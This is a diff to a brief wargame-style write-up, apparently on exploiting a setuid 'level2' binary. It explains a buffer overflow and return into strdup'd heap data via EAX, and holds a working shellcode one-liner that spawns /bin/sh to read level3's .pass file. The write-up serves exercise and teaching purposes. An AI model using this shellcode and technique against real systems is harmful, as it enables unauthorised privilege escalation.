@@ -2,5 +2,5 @@
 2) because there is no size limit for the input, we can exploit this program with a buffer overflow to write any data into EIP, but there is a restriction that prevent us to put high located addresses (generally stack addresses) into it
 3) fortunately, the program use strdup to copy the buffer into the heap, and place the low located address of that data into the EAX register
 4) so if we put the EAX address into EIP we will jump to that arbitrary data, we just have to set the data with a shellcode that launch execve("/bin/sh") :
-(echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xa0\x04\x08" ; cat) | ./level2
+(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08"' ; cat) | ./level2
 5) because the executable is setuid by level3, when we get the shell we can navigate to level3 home and open the .pass file
